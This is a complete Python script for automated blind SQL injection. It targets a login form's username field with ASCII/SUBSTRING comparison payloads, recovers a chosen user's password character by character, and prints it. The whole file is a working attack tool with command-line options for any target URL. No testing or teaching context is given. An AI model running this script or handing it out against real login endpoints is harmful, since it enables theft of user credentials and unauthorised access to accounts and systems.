#!/usr/bin/python3

import requests
import string
import argparse
import sys

def obtain_args():
    parser = argparse.ArgumentParser(description="Automated Blind SQLi", add_help=False)
    parser.add_argument("-u", "--user", help="Username objective.")
    parser.add_argument("-t", "--target", help="URL or IP of the login POST endpoint.")
    parser.add_argument("-m", "--message", help="Message to know when the payload is valid.")
    parser.add_argument("-h", "--help", action="store_true", help="Show usage info.")
    return parser.parse_args()

def show_usage():
    print(f"USAGE: ./sqli_credentials.py -u [username] -t [target] -m \"[message]\"")
    print(f"\t-u --user: The username we are going to obtain the password.")
    print(f"\t-t --target: The domain or IP address where the POST login is sent.")
    print(f"\t-m --message: Message to know when the payload is valid.")
    print(f"\t-h --help: Print this menu")

def sqli_attack(url, username, message):
    print(f"[+] Attacking the user {username} in {url}")
    
    # dictionary with a-z, A-Z, 0-9 and symbols
    dictionary = string.ascii_letters + string.digits + string.punctuation

    password = ""

    for position in range(1,21):
        found = False

        for char in dictionary:
            # 1. Convert the char into its ASCII value
            ascii_value = ord(char)
    
            # 2. Build the payload comparing NUMBERS, not characters 
            payload = f"' AND ASCII(SUBSTRING(password, {position}, 1)) = {ascii_value}-- -"

            # 3. Build the request.
            data = {
                "username": username + payload,
                "password": "dummyPassword"
            }

            # 4. Make the request
            r = requests.post(url, data=data)

            # 5. Validate if it was the right character
            if message in r.text:
                password += char
                print(f"\r[-] Actual password: {password}", end="")
                found = True
                break

        if not found:
            print(f"\n[!] Not more characters found.")
            break
    return password



def main():
    args = obtain_args()

    if args.help or not args.user or not args.target or not args.message:
        show_usage()
        sys.exit(1)

    final_password = sqli_attack(args.target, args.user, args.message)
    print(f"\n [SUCCESS] The password for the user {args.user} is: {final_password}")

main()

